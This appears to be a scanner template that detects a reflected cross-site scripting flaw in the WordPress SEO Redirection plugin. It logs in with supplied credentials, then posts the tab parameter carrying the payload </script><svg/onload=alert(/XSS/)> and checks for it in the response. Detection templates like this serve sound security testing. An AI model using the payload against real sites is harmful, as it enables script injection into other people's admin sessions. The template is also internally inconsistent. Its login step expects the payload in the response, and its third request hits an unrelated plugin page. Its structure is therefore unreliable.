id: seo-redirection-xss
brief:
    title: WordPress SEO Redirection <7.4 - Cross-Site Scripting
    by: DhiyaneshDK
    level: medium
    about: WordPress SEO Redirection 7.4 does not escape the tab parameter before outputting it back in JavaScript code, leading to a reflected cross-site scripting vulnerability.
    label:
        - wordpress
        - xss
        - wp-plugin
        - authenticated
        - wpscan
        - vuln
    score: CVSS:5.4
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check
        Origin: '{{RootURL}}'
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - </script><svg/onload=alert(/XSS/)>
            - settings_page_seo-redirection
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: POST
      to:
        - '{{BaseURL}}/wp-admin/options-general.php?page=seo-redirection.php&tab=cutom'
      head:
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check
      body: tab=%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%3E
      signs:
        - "on": word
          has:
            - </script><svg/onload=alert(/XSS/)>
            - settings_page_seo-redirection
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin.php?page=wpda_duplicate_post_menu'
      signs:
        - "on": word
          has:
            - </script><svg/onload=alert(/XSS/)>
            - settings_page_seo-redirection
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
